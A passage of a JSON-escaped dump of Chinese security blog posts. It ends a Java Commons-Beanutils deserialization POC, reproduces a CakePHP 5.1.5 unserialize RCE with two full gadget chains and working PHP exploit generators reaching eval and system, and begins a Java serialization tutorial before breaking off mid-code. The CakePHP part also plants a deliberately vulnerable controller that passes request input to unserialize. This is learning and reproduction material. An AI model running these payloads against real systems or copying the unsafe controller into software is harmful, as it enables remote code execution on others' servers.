PriorityQueue#siftDownUsingComparator()\n    \n//compare方法->getter方法\n->BeanComparator#compare()\n    ->PropertyUtils#getProperty()\n\nTemplatesImpl类：\n            ->TemplatesImpl#getOutputProperties()\n                TemplatesImpl#newTransformer()\n                    ->TemplatesImpl#getTransletInstance()\n                        ->TemplatesImpl#defineTransletClasses()\n                            ->TemplatesImpl#defineClass()\nTransletClassLoader类：\n                                ->defineClass()\n```\n\n## 0x07编写POC\n\n### POC1(with CC依赖)\n\n```java\npackage CBchains.POC;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.beanutils.BeanComparator;\n\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.PriorityQueue;\n\npublic class CBPOC {\n    public static void main(String[] args) throws Exception {\n        //CC3\n        TemplatesImpl templates = new TemplatesImpl();\n        setFieldValue(templates,\"_name\",\"a\");\n        byte[] code = Files.readAllBytes(Paths.get(\"E:\\\\java\\\\JavaSec\\\\JavaSerialize\\\\target\\\\classes\\\\CCchains\\\\CC3\\\\POC.class\"));\n        byte[][] codes = {code};\n        setFieldValue(templates,\"_bytecodes\",codes);\n        setFieldValue(templates,\"_tfactory\",new TransformerFactoryImpl());\n\n        //CB&&add()方法\n        BeanComparator comparator = new BeanComparator();\n        PriorityQueue queue = new PriorityQueue<Object>(2, comparator);\n        queue.add(1);\n        queue.add(2);\n        setFieldValue(comparator, \"property\", \"outputProperties\");//修改property触发getter方法\n        setFieldValue(queue,\"queue\",new Object[]{templates,templates});// 设置BeanComparator.compare()的参数\n\n        serialize(queue);\n        unserialize(\"CBchains.txt\");\n    }\n    public static void setFieldValue(Object object, String field_name, Object field_value) throws Exception {\n        Class c = object.getClass();\n        Field field = c.getDeclaredField(field_name);\n        field.setAccessible(true);\n        field.set(object, field_value);\n    }\n    //定义序列化操作\n    public static void serialize(Object object) throws IOException {\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"CBchains.txt\"));\n        oos.writeObject(object);\n        oos.close();\n    }\n\n    //定义反序列化操作\n    public static void unserialize(String filename) throws IOException, ClassNotFoundException{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));\n        ois.readObject();\n    }\n}\n```\n\n![image-20250706141832847](../image/achieve/202411/PHP反序列化/image-20250706141832847.png)\n\n成功触发，但是这个是需要CC依赖的，是否有不需要CC依赖的呢？答案是有的，这个的话等复现shiro550的时候再学吧\n","tags":["java反序列化"],"categories":["javasec"]},{"title":"PHP反序列化-CakePHP5.1.5框架","url":"/2025/07/04/PHP反序列化-CakePHP5.1.5框架/","content":"\n## 0x01CakePHP框架\n\n官方文档：https://book.cakephp.org/5/en/intro.html\n\nCakePHP 5 是一个基于 PHP **8.4**（最低 PHP 8.1）的 Web 开发框架。采用 **MVC（Model-View-Controller）架构**，旨在帮助开发者快速构建稳定、可扩展的 Web 应用程序。它提供了丰富的内置功能，如数据库访问、表单验证、安全防护、缓存管理等，同时遵循 **\"约定优于配置\"（Convention over Configuration）** 原则，减少开发者的手动配置工作。\n\n## 0x02漏洞描述\n\n其实这个漏洞是infer师傅审出来的一个反序列化的漏洞，因为之前也审过很多php框架的漏洞，所以我还是想给自己挑战一下这种还没公开的框架反序列化看看能不能审出来\n\nCakephp v.5.1.5及之前版本中存在一个问题，允许远程攻击者通过unserialize（）函数执行任意代码（**CVE-2025-25718**）\n\n对PHP版本的要求：最低 PHP 8.1（支持**8.4**）。\n\n## 0x03项目搭建\n\n先下一个PHP8.1以上的版本，我这里是直接用的8.1.32版本\n\n然后我们用composer创建一个CakePHP项目\n\n```php\ncomposer create-project --prefer-dist cakephp/app:~5.0 cakephp_project\n```\n\n![image-20250630194441260](../image/achieve/202411/CVE复现/image-20250630194441260.png)\n\n碰到一个报错，说是PHP 环境缺少 **OpenSSL 扩展**，需要开启该扩展，给php.ini文件修改一下\n\n```php\nextension=openssl\n```\n\n然后再试一下还是不行\n\n顺便把这些扩展也开了吧\n\n```php\nextension=curl\nextension=intl\nextension=pdo_mysql\nextension=pdo_sqlite\nextension=gd\nextension=mbstring\nextension=sqlite3\n```\n\n结果还是不行。。。\n\n后面把小皮和里面的php全部删了重新下载，结果发现可以了\n\n![image-20250703222229667](../image/achieve/202411/CVE复现/image-20250703222229667.png)\n\n不过这里得把zip的扩展也开了\n\n好了之后我们启动项目试试\n\n```php\ncd my_cakephp_project\nphp bin/cake.php server\t//Windows下\nbin/cake.php server\t//Linux下\n```\n\n![image-20250703222434793](../image/achieve/202411/CVE复现/image-20250703222434793.png)\n\n然后访问8765端口\n\n![image-20250703222638339](../image/achieve/202411/CVE复现/image-20250703222638339.png)\n\n把版本换成5.1.5的也可以\n\n![image-20250704154005380](../image/achieve/202411/PHP反序列化/image-20250704154005380.png)\n\n然后我们自己在\\src\\Controller下写一个反序列化的路由\n\n```php\n<?php\nnamespace App\\Controller;\n\nuse App\\Controller\\AppController;\n\nclass TestController extends AppController{\n\n    public function test(){\n        if(isset($_GET['poc'])){\n            unserialize(base64_decode($_GET['poc']));\n        }else{\n            highlight_file(__FILE__);\n        }\n        return \"success\";\n    }\n}\n```\n\nCakePHP 默认的路由规则会自动将 `/test/test` 映射到 `TestController::test()`\n\n## 0x04链子分析\n\n我们用phpstorm打开该项目， 先搜一下常见的链子入口函数`__destruct()`，筛选之后找到一个类\n\n### RejectedPromise::__destruct()\n\n在cakephp-5.1.5\\vendor\\react\\promise\\src\\Internal\\RejectedPromise.php中\n\n```php\n    public function __destruct()\n    {\n        if ($this->handled) {\n            return;\n        }\n\n        $handler = set_rejection_handler(null);\n        if ($handler === null) {\n            $message = 'Unhandled promise rejection with ' . $this->reason;\n\n            \\error_log($message);\n            return;\n        }\n\n        try {\n            $handler($this->reason);\n        } catch (\\Throwable $e) {\n            \\preg_match('/^([^:\\s]++)(.*+)$/sm', (string) $e, $match);\n            \\assert(isset($match[1], $match[2]));\n            $message = 'Fatal error: Uncaught ' . $match[1] . ' from unhandled promise rejection handler' . $match[2];\n\n            \\error_log($message);\n            exit(255);\n        }\n    }\n```\n\n这里的话需要先设置handler的值，防止return跳出\n\n![image-20250704154229816](../image/achieve/202411/PHP反序列化/image-20250704154229816.png)\n\n这里的话会进行字符串的拼接，那么就可能导致触发`__toString()`方法，我们看看该方法是否可控\n\n```php\nprivate $reason;\n```\n\n是私有属性的，我们看一下构造函数\n\n```php\n    public function __construct(\\Throwable $reason)\n    {\n        $this->reason = $reason;\n    }\n```\n\n公共的属性，那么就可以控制该属性的值\n\n全局搜索一下`__toString()`方法\n\n### Response::__toString()\n\n在\\cakephp-5.1.5\\vendor\\cakephp\\cakephp\\src\\Http\\Response.php中\n\n```php\n    public function __toString(): string\n    {\n        $this->stream->rewind();\n\n        return $this->stream->getContents();\n    }\n```\n\n这里的话会调用rewind方法和getContents方法，并且这里的话stream是可控的 （分析方法也是看构造函数）\n\n既然可控的话，我们就有两个路线，一个就是看这两个方法有没有什么可利用的点，另一个就是触发`__call()`方法\n\n但是那两个方法都没有什么可利用的地方，那我们就关注一下触发`__call()`\n\n全局搜索`__call()`方法\n\n### Table::__call()\n\n在\\cakephp-5.1.5\\vendor\\cakephp\\cakephp\\src\\ORM\\Table.php中\n\n```php\n    public function __call(string $method, array $args): mixed\n    {\n        if ($this->_behaviors->hasMethod($method)) {\n            return $this->_behaviors->call($method, $args);\n        }\n        if (preg_match('/^find(?:\\w+)?By/', $method) > 0) {\n            return $this->_dynamicFinder($method, $args);\n        }\n\n        throw new BadMethodCallException(\n            sprintf('Unknown method `%s` called on `%s`', $method, static::class),\n        );\n    }\n```\n\n这里的话会调用hasMethod方法检查Behavior中的方法，而hasMethod方法是在BehaviorRegistry类中的\n\n```php\n    public function hasMethod(string $method): bool\n    {\n        $method = strtolower($method);\n\n        return isset($this->_methodMap[$method]);\n    }\n```\n\n再跟进下`_methodMap`\n\n```php\nprotected array $_methodMap = [];\n```\n\n从上面可以发现，我们的方法名就是rewind，所以我们需要设置`_methodMap`中一个值rewind，才能通过if语句的判断并调用call方法\n\n我们跟进下call方法\n\n```php\n   public function call(string $method, array $args = []): mixed\n    {\n        $method = strtolower($method);\n        if ($this->hasMethod($method) && $this->has($this->_methodMap[$method][0])) {\n            [$behavior, $callMethod] = $this->_methodMap[$method];\n\n            return $this->_loaded[$behavior]->{$callMethod}(...$args);\n        }\n\n        throw new BadMethodCallException(\n            sprintf('Cannot call `%s`, it does not belong to any attached behavior.', $method),\n        );\n    }\n```\n\n在这个if语句中前面的hasMethod方法是前面看过的，然后我们看下后面的has方法，该方法是BehaviorRegistry的父类ObjectRegistry类中的方法\n\n```php\n    public function has(string $name): bool\n    {\n        return isset($this->_loaded[$name]);\n    }\n```\n\n这里的话还是可控的，那就可以通过if语句进入return内容\n\n```php\nreturn $this->_loaded[$behavior]->{$callMethod}(...$args);\n```\n\n这里的话就是一个动态调用函数，所以call函数可以调用任意类的任意函数，但是问题是这里的参数并不可控，如果按照刚刚的路线的话，方法名就固定是rewind了，那么我们需要另外找一个函数，全局搜一下危险函数如eval，call_user_func这些\n\n### MockClass::generate()\n\n在\\cakephp-5.1.5\\vendor\\phpunit\\phpunit\\src\\Framework\\MockObject\\Generator\\MockClass.php\n\n```php\n    public function generate(): string\n    {\n        if (!class_exists($this->mockName, false)) {\n            eval($this->classCode);\n\n            call_user_func(\n                [\n                    $this->mockName,\n                    '__phpunit_initConfigurableMethods',\n                ],\n                ...$this->configurableMethods,\n            );\n        }\n\n        return $this->mockName;\n    }\n```\n\n这个generate函数的话不需要参数，并且classCode变量是可控的，if语句中的也是可控的，那么就可以用这个去打\n\n## 0x05最终的链子&POC\n\n### 最终的链子1\n\n```php\nRejectedPromise::__destruct()->Response::__toString()->Table::__call()->BehaviorRegistry::call()->MockClass::generate()->eval()\n```\n\n所以我们的poc就是\n\n### POC1\n\n```php\n<?php\nnamespace React\\Promise\\Internal;\nuse Cake\\Http\\Response;\nfinal class RejectedPromise\n{\n    private $reason;\n    private $handled = false;\n    public function __construct(){\n        $this->reason = new Response();\n    }\n}\n\n\nnamespace Cake\\Http;\nuse Cake\\ORM\\Table;\nclass Response\n{\n    private $stream;\n    public function __construct(){\n        $this->stream = new Table();\n    }\n}\n\n\nnamespace Cake\\ORM;\nuse PHPUnit\\Framework\\MockObject\\Generator\\MockClass;\nclass Table{\n    protected $_behaviors;\n    public function __construct(){\n        $this->_behaviors = new BehaviorRegistry();\n    }\n}\n\nclass ObjectRegistry{}\nclass BehaviorRegistry extends ObjectRegistry\n{\n    protected $_methodMap;\n    protected $_loaded = [];\n    public function __construct(){\n        $this->_methodMap = [\"rewind\"=>array(\"test\",\"generate\")];\n        $this->_loaded = [\"test\"=>new MockClass()];\n    }\n}\n\n\nnamespace PHPUnit\\Framework\\MockObject\\Generator;\nfinal class MockClass\n{\n    private $mockName;\n    private $classCode;\n    public function __construct() {\n        $this->mockName = \"aaa\";\n        $this->classCode = \"phpinfo();\";\n    }\n\n}\n\n\nnamespace React\\Promise\\Internal;\n$a = new RejectedPromise();\necho base64_encode(serialize($a));\n\n```\n\n进行URL编码后传入\n\n![image-20250704164901767](../image/achieve/202411/PHP反序列化/image-20250704164901767.png)\n\n代码执行成功\n\n## 0x06链子2分析\n\n和上面的前半段是一样的，然后就到`__toString()`方法不一样\n\n### Pool::__toString()\n\n在cakephp-5.1.5\\vendor\\composer\\composer\\src\\Composer\\DependencyResolver\\Pool.php中的`__toString()`\n\n```php\n    public function __toString(): string\n    {\n        $str = \"Pool:\\n\";\n\n        foreach ($this->packages as $package) {\n            $str .= '- '.str_pad((string) $package->id, 6, ' ', STR_PAD_LEFT).': '.$package->getName().\"\\n\";\n        }\n\n        return $str;\n    }\n```\n\n这里的话也是用的字符串拼接，用了foreach语句进行遍历，但是如果我们的变量是一个接入**IteratorAggregate**接口的对象，那么就会自动调用类里的`getIterator`方法\n\nhttps://php.golaravel.com/language.oop5.iterations.html\n\n我们全局搜索一下`getIterator`方法\n\n### MapReduce::getIterator()\n\n在vendor/cakephp/cakephp/src/Collection/Iterator/MapReduce.php中\n\n```php\n    public function getIterator(): Traversable\n    {\n        if (!$this->_executed) {\n            $this->_execute();\n        }\n\n        return new ArrayIterator($this->_result);\n    }\nprotected bool $_executed = false;\n```\n\n`_executed`变量默认是false，我们跟进`_execute`方法\n\n```php\n    protected function _execute(): void\n    {\n        $mapper = $this->_mapper;\n        foreach ($this->_data as $key => $val) {\n            $mapper($val, $key, $this);\n        }\n\n        if ($this->_intermediate && $this->_reducer === null) {\n            throw new LogicException('No reducer function was provided');\n        }\n\n        $reducer = $this->_reducer;\n        if ($reducer !== null) {\n            foreach ($this->_intermediate as $key => $list) {\n                $reducer($list, $key, $this);\n            }\n        }\n        $this->_intermediate = [];\n        $this->_executed = true;\n    }\n```\n\n主要看这段代码\n\n![image-20250704170032733](../image/achieve/202411/PHP反序列化/image-20250704170032733.png)\n\n这里的话也是用到了动态函数调用的方法，那我们看看这三个参数是否可控\n\n```php\nprotected $_mapper;\nprotected iterable $_data;\npublic function __construct(iterable $data, callable $mapper, ?callable $reducer = null)\n{\n    $this->_data = $data;\n    $this->_mapper = $mapper;\n    $this->_reducer = $reducer;\n}\n```\n\n参数可控，那我们可以用call_user_func，从而进行RCE\n\n### 最终的链子2\n\n```php\nRejectedPromise::__destruct()->Pool::__toString()->MapReduce::getIterator()\n```\n\n### POC2\n\n```php\n<?php\nnamespace React\\Promise\\Internal;\nuse Composer\\DependencyResolver\\Pool;\nclass RejectedPromise\n{\n    private $handled;\n    private $reason;\n\n    public function __construct()\n    {\n        $this->handled = false;\n        $this->reason = new Pool();\n    }\n}\n\n\nnamespace Composer\\DependencyResolver;\nuse Cake\\Collection\\Iterator\\MapReduce;\nclass Pool\n{\n    protected $packages;\n\n    public function __construct()\n    {\n        $this->packages = new MapReduce();\n    }\n}\n\nnamespace Cake\\Collection\\Iterator;\nclass MapReduce\n{\n    protected $_mapper;\n    protected $_data;\n\n    public function __construct()\n    {\n        $this->_mapper = \"call_user_func\";\n        $this->_data = [\"calc\" => \"system\"];\n    }\n}\n\n\nnamespace React\\Promise\\Internal;\n$a = new RejectedPromise();\necho base64_encode(serialize($a));\n\n```\n\n貌似这里是没回显的？只能打无回显RCE这些了\n","tags":["cakephp框架"],"categories":["PHP反序列化"]},{"title":"Java反序列化","url":"/2025/07/01/Java反序列化/","content":"\n因为前面学习了java的一些基础知识，java反序列化也算是搁置了很久的知识点，所以就来学习一下关于这个java反序列化的知识点\n\n参考文章和视频:\n\n[JAVA反序列化漏洞总结-青叶](https://evalexp.top/p/51973/)\n\n[java序列化与反序列化全讲解](https://blog.csdn.net/mocas_wang/article/details/107621010?ops_request_misc=%257B%2522request%255Fid%2522%253A%25220080c4e906041c359da2885ad46d41f6%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=0080c4e906041c359da2885ad46d41f6&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-107621010-null-null.142^v101^control&utm_term=mocas_wang&spm=1018.2226.3001.4187)\n\n[Java反序列化漏洞专题-基础篇(21/09/05更新类加载部分)](https://www.bilibili.com/video/BV16h411z7o9/?vd_source=8b5b7b4de91c439593332c8ba167e048)\n\n## 什么是java反序列化\n\nJava 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存或文件中，实现跨平台通讯和持久化存储，而反序列化则指把字节序列恢复为 Java 对象的过程。(这个的话在之前学ctfshow里头的反序列化篇也有详细的介绍过)\n\n## 为什么需要序列化\n\n我们知道，当两个进程进行远程通信时，可以相互发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。那么当两个Java进程进行通信时，能否实现进程间的对象传送呢？答案是可以的。如何做到呢？这就需要Java序列化与反序列化了。发送方需要把这个Java对象转换为字节序列，然后在网络上传送；另一方面，接收方需要从字节序列中恢复出Java对象。\n\n那么由此可以看出java序列化和反序列化的好处就是一是实现数据的存储二是实现数据的传输\n\n## 序列化和反序列化的实现\n\n### 实现方法\n\n- ObjectOutputStream类的 writeObject() 方法可以实现序列化。\n\n- ObjectInputStream 类的 readObject() 方法用于反序列化。\n\n具体的实现方法\n\n通过 ObjectOutputStream 将需要序列化数据写入到流中，因为 Java IO 是一种装饰者模式，因此可以通过 ObjectOutStream 包装 FileOutStream 将数据**写入到文件中**或者包装 ByteArrayOutStream 将数据**写入到内存中**，这就是序列化的过程。同理，可以通过 ObjectInputStream 将数据从磁盘 FileInputStream 或者内存 ByteArrayInputStream 读取出来然后转化为指定的对象即可，也就是反序列化\n\n我们先写个demo测试一下\n\n### Demo代码分析\n\n先写个简单的类\n\n```java\nimport java.io.*;\n//People类\npublic class People implements Serializable{\n\n    //类属性\n    public String name;\n    public int age;\n    public String sex;\n\n    //构造方法\n\n    public People(String name,String sex,int age){\n\n        this.name = name;\n        this.age = age;\n        this.sex = sex;\n    }\n\n    @Override\n    public String toString(){\n        return \"People's name is \" + name + \"\\n\"\n                +\"People's age is \" + age + \"\\n\"\n                +\"People's sex is \" + sex + \"\\n\";\n    }\n\n}\n```\n\n然后我们来写序列化和反序列化的实现\n\n```java\nclass SerializeDemo {\n\n    //序列化操作\n    public static void main(String[] args) throws IOException, ClassNotFoundException {\n        System.out.println(\"----------序列化开始----------\");\n        People p = new People(\"John\", \"Male\", 30);\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"People.txt\"));\n        oos.writeObject(p);\n        oos.flush();\n        oos.close();\n\n        //反序列化操作\n        System.out.println(\"----------反序列化开始----------\");\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"People.txt\"));\n        People p1 = (People) ois.readObject();\n        ois.close();\n        System.out.println(p1);\n    }\n}\n```\n\n先看输出结果\n\n![image-20250526091421807](../image/achieve/202411/java学习/image-20250526091421807.png)\n\n可以看到这里触发了`toString()`方法，是为什么呢？打个断点看看\n\n![image-20250526091531398](../image/achieve/202411/java学习/image-20250526091531398.png)\n\n开始调试，可以发现执行到33行代码即实例化对象的时候会同时调用构造方法\n\n![image-20250526091722915](../image/achieve/202411/java学习/image-20250526091722915.png)\n\n所以构造方法是在实例化对象的时候触发的，我们接下来执行代码\n\n![image-20250526091947755](../image/achieve/202411/java学习/image-20250526091947755.png)\n\n发现代码在第44行的时候触发了`toString()`方法，这是因为我们直接将对象进行打印，这貌似跟PHP反序列化的`__toString()`方法的触发条件一样，假如这里改成`System.out.println(p1.name)`则不会触发`toString()`方法\n\n代码走完了，我们来分析一下序列化和反序列化的操作\n\n### 序列化分析\n\n```java\nclass SerializeDemo {\n\n    //序列化操作\n    public static void main(String[] args) throws IOException, ClassNotFoundException {\n        System.out.println(\"----------序列化开始----------\");\n        People p = new People(\"John\", \"Male\", 30);\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"People.txt\"));\n        oos.writeObject(p);\n        oos.flush();\n        oos.close();\n    }\n}\n```\n\n先看看序列化的过程\n\n在main方法中，这里先是实例化了一个有Serializable序列化接口的对象p，然后就开始进行序列化操作\n\n- `new FileOutputStream(\"People.txt\")`\n\n这里是实例化了一个java.io包中的FileOutputStream对象，该类用于将数据写入 `File`或 的输出流`FileDescriptor`，`FileOutputStream`用于写入原始字节流（例如图像数据），并调用了该类的构造方法，用于将数据写入到指定文件中。这是一个写文件的操作，文件File就是我们指定的文件名or文件路径\n\n![image-20250526092748032](../image/achieve/202411/java学习/image-20250526092748032.png)\n\n- `new ObjectOutputStream(new FileOutputStream(\"People.txt\"));`\n\n实例化了一个java.io包中的 `ObjectOutputStream` 对象，用于将 Java 对象序列化并写入到输出流中。(只有支持 java.io.Serializable 接口的对象才能写入流。)\n\n- `oos.writeObject(p);`\n\n这里调用了`ObjectOutputStream` 对象中的writeObject方法，用于将指定的对象写入`ObjectOutputStream`\n\n![image-20250526093916479](../image/achieve/202411/java学习/image-20250526093916479.png)\n\n以上就是序列化的过程，ObjectOutputStream代表对象输出流，利用它的writeObject方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流FileInputStream指定的文件中。\n\n然后我们再看看反序列化的过程\n\n### 反序列化分析\n\n```java\n//反序列化操作\nSystem.out.println(\"----------反序列化开始----------\");\nObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"People.txt\"));\nPeople p1 = (People) ois.readObject();\nois.close();\nSystem.out.println(p1.name);\n```\n\n- `new FileInputStream(\"People.txt\")`：创建一个 `FileInputStream` 对象，用于从文件 `\"People.txt\"` 中读取字节数据。\n- `new ObjectInputStream(...)`：将 `FileInputStream` 包装为 `ObjectInputStream`，使其能够从字节流中反序列化对象。\n\n反序列化的过程是从文件`People.txt`中读取输入流，然后通过`ObjectInputStream`将输入流中的字节码反序列化为对象，最后通过`ois.readObject()`将对象恢复为类的实例。然后我们看看关于readObject()方法\n\n- `People p1 = (People) ois.readObject();`\n\nreadObject()方法从 ObjectInputStream 读取一个对象。读取该对象的类、类的签名以及该类及其所有超类型的非瞬态和非静态字段的值。然后返回从流中读取的对象\n\n![image-20250526095011259](../image/achieve/202411/java学习/image-20250526095011259.png)\n\n由于返回的对象类型是 `Object`，因此需要强制类型转换为 `People`。\n\n接下来我们看一下几个重要的函数和方法\n\n### 分析函数\n\n- `ObjectOutputStream`构造函数\n\n我们右键跟进该类的声明\n\n```java\npublic ObjectOutputStream(OutputStream out) throws IOException {\n    verifySubclass();\n    bout = new BlockDataOutputStream(out);\n    handles = new HandleTable(10, (float) 3.00);\n    subs = new ReplaceTable(10, (float) 3.00);\n    enableOverride = false;\n    writeStreamHeader();\n    bout.setBlockDataMode(true);\n    if (extendedDebugInfo) {\n        debugInfoStack = new DebugTraceInfoStack();\n    } else {\n        debugInfoStack = null;\n    }\n}\n```\n\n- `bout = new BlockDataOutputStream(out);`：创建一个 `BlockDataOutputStream` 对象，用于管理底层输出流。\n- `enableOverride = false;`：`enableOverride` 用于控制是否允许子类重写 `writeObject()` 方法。如果为 true ，那么需要重写 writeObjectOverride 方法。但是一般默认为false\n\n然后我们跟进writeStreamHeader()方法\n\n该方法用于写入序列化流的头部信息。\n\n```java\nprotected void writeStreamHeader() throws IOException {\n    bout.writeShort(STREAM_MAGIC);\n    bout.writeShort(STREAM_VERSION);\n}\n```\n\n- STREAM_MAGIC 声明使用了序列化协议，bout 就是一个流，将对应的头数据写入该流中\n- STREAM_VERSION 指定序列化协议版本\n\n看完了构造函数，我们接下来看看writeObject()方法都干了啥\n\n```java\npublic final void writeObject(Object obj) throws IOException {\n    if (enableOverride) {\n        writeObjectOverride(obj);\n        return;\n    }\n    try {\n        writeObject0(obj, false);\n    } catch (IOException ex) {\n        if (depth == 0) {\n            writeFatalException(ex);\n        }\n        throw ex;\n    }\n}\n```\n\n出现了一个if语句，这让我联想起刚刚写的enableOverride重写writeObject()的问题，但是默认是为false，所以这里是不会执行的\n\n- `writeObject0(obj, false);`这里的话就是执行序列化的方法了，跟进看一下\n\n```java\n    private void writeObject0(Object obj, boolean unshared)\n        throws IOException\n    {\n        boolean oldMode = bout.setBlockDataMode(false);\n        depth++;\n        try {\n            // handle previously written and non-replaceable objects\n            int h;\n            if ((obj = subs.lookup(obj)) == null) {\n                writeNull();\n                return;\n            } else if (!unshared && (h = handles.lookup(obj)) != -1) {\n                writeHandle(h);\n                return;\n            } else if (obj instanceof Class) {\n                writeClass((Class) obj, unshared);\n                return;\n            } else if (obj instanceof ObjectStreamClass) {\n                writeClassDesc((ObjectStreamClass) obj, unshared);\n                return;\n            }\n\n            // check for replacement object\n            Object orig = obj;\n            Class<?> cl = obj.getClass();\n            ObjectStreamClass desc;\n            for (;;) {\n                // REMIND: skip this check for strings/arrays?\n                Class<?> repCl;\n                desc = ObjectStreamClass.lookup(cl, true);\n                if (!desc.hasWriteReplaceMethod() ||\n                    (obj = desc.invokeWriteReplace(obj)) == null ||\n                    (repCl = obj.getClass()) == cl)\n                {\n                    break;\n                }\n                cl = repCl;\n            }\n            if (enableReplace) {\n                Object rep = replaceObject(obj);\n                if (rep != obj && rep != null) {\n                    cl = rep.getClass();\n                    desc = ObjectStreamClass.lookup(cl, true);\n                }\n                obj = rep;\n            }\n\n            // if object replaced, run through original checks a second time\n            if (obj != orig) {\n                subs.assign(orig, obj);\n                if (obj == null) {\n                    writeNull();\n                    return;\n                } else if (!unshared && (h = handles.lookup(obj)) != -1) {\n                    writeHandle(h);\n                    return;\n                } else if (obj instanceof Class) {\n                    writeClass((Class) obj, unshared);\n                    return;\n                } else if (obj instanceof ObjectStreamClass) {\n                    writeClassDesc((ObjectStreamClass) obj, unshared);\n                    return;\n                }\n            }\n\n            // remaining cases\n            if (obj instanceof String) {\n                writeString((String) obj, unshared);\n            } else if (cl.isArray()) {\n                writeArray(obj, desc, unshared);\n            } else if (obj instanceof Enum) {\n                writeEnum((Enum<?>) obj, desc, unshared);\n            } else if (obj instanceof Serializable) {\n                writeOrdinaryObject(obj, desc, unshared);\n            } else {\n                if (extendedDebugInfo) {\n                    throw new NotSerializableException(\n                        cl.getName() + \"\\n\" + debugInfoStack.toString());\n                } else {\n                    throw new NotSerializableException(cl.getName());\n                }\n            }\n        } finally {\n            depth--;\n            bout.setBlockDataMode(oldMode);\n        }\n    }\n```\n\n- `desc = ObjectStreamClass.lookup(cl, true);`这里通过调用lookup方法 查找类的描述信息，通过它就可以获取对象及其对象属性的相关信息。\n\n```java\nif (obj instanceof Class) {\n                writeClass((Class) obj, unshared);\n                return;\n            } else if (obj instanceof ObjectStreamClass) {\n                writeClassDesc((ObjectStreamClass) obj, unshared);\n                return;\n            }\n        }\n\n        // remaining cases\n        if (obj instanceof String) {\n            writeString((String) obj, unshared);\n        } else if (cl.isArray()) {\n            writeArray(obj, desc, unshared);\n        } else if (obj instanceof Enum) {\n            writeEnum((Enum<?>) obj, desc, unshared);\n        } else if (obj instanceof Serializable) {\n            writeOrdinaryObject(obj, desc, unshared);\n        } else {\n            if (extendedDebugInfo) {\n                throw new NotSerializableException(\n                    cl.getName() + \"\\n\" + debugInfoStack.toString());\n            } else {\n                throw new NotSerializableException(cl.getName());\n            }\n        }\n    }\n```\n\n然后这里的话就是根据 obj 的类型去执行序列化操作，如果为class类型则执行**`writeClass`**方法并返回，如果为`ObjectStreamClass` 类型则执行**`writeClassDesc`**方法等等，其最终结果都是往流中写入不同类型的对象\n\n上面就是大致的序列化相干函数的分析，接下来我们看看反序列化的\n\n- `ObjectInputStream`构造函数\n\n```java\npublic ObjectInputStream(InputStream in) throws IOException {\n    verifySubclass();\n    bin = new BlockDataInputStream(in);\n    handles = new HandleTable(10);\n    vlist = new ValidationList();\n    streamFilterSet = false;\n    serialFilter = Config.getSerialFilterFactorySingleton().apply(null, Config.getSerialFilter());\n    enableOverride = false;\n    readStreamHeader();\n    bin.setBlockDataMode(true);\n}\n```\n\n这个构造函数是用于初始化反序列化流并对一些基础配置进行设置的，跟上面的其实差不太多，我们跟进readStreamHeader()方法\n\n```java\nprotected void readStreamHeader()\n    throws IOException, StreamCorruptedException\n{\n    short s0 = bin.readShort();\n    short s1 = bin.readShort();\n    if (s0 != STREAM_MAGIC || s1 != STREAM_VERSION) {\n        throw new StreamCorruptedException(\n            String.format(\"invalid stream header: %04X%04X\", s0, s1));\n    }\n}\n```\n\n这里是用于验证序列化流的头部信息的，通过读取序列化流中的序列版本和序列化协议检测头部信息是否有效，如果无效则会抛出异常\n\n然后我们看看readObject方法\n\n```java\npublic final Object readObject()\n    throws IOException, ClassNotFoundException {\n    return readObject(Object.class);\n}\n```\n\n跟进readObject方法，这个方法会从序列化流中读取一个对象，并将其强制转换为 `Object` 类型。\n\n```java\nprivate final Object readObject(Class<?> type)\n    throws IOException, ClassNotFoundException\n{\n    if (enableOverride) {\n        return readObjectOverride();\n    }\n\n    if (! (type == Object.class || type == String.class))\n        throw new AssertionError(\"internal error\");\n\n    // if nested read, passHandle contains handle of enclosing object\n    int outerHandle = passHandle;\n    try {\n        Object obj = readObject0(type, false);\n        handles.markDependency(outerHandle, passHandle);\n        ClassNotFoundException ex = handles.lookupException(passHandle);\n        if (ex != null) {\n            throw ex;\n        }\n        if (depth == 0) {\n            vlist.doCallbacks();\n            freeze();\n        }\n        return obj;\n    } finally {\n        passHandle = outerHandle;\n        if (closed && depth == 0) {\n            clear();\n        }\n    }\n}\n```\n\n前面的重写和判断类型就不说了，直接看后面的\n\n- `Object obj = readObject0(type, false);`这里从流中读取一个对象，进行一些异常处理和检测后返回读取的对象，之后关闭流并清理资源\n\n跟进readObject0\n\n```java\n    private Object readObject0(Class<?> type, boolean unshared) throws IOException {\n        boolean oldMode = bin.getBlockDataMode();\n        if (oldMode) {\n            int remain = bin.currentBlockRemaining();\n            if (remain > 0) {\n                throw new OptionalDataException(remain);\n            } else if (defaultDataEnd) {\n                /*\n                 * Fix for 4360508: stream is currently at the end of a field\n                 * value block written via default serialization; since there\n                 * is no terminating TC_ENDBLOCKDATA tag, simulate\n                 * end-of-custom-data behavior explicitly.\n                 */\n                throw new OptionalDataException(true);\n            }\n            bin.setBlockDataMode(false);\n        }\n\n        byte tc;\n        while ((tc = bin.peekByte()) == TC_RESET) {\n            bin.readByte();\n            handleReset();\n        }\n\n        depth++;\n        totalObjectRefs++;\n        try {\n            switch (tc) {\n                case TC_NULL:\n                    return readNull();\n\n                case TC_REFERENCE:\n                    // check the type of the existing object\n                    return type.cast(readHandle(unshared));\n\n                case TC_CLASS:\n                    if (type == String.class) {\n                        throw new ClassCastException(\"Cannot cast a class to java.lang.String\");\n                    }\n                    return readClass(unshared);\n\n                case TC_CLASSDESC:\n                case 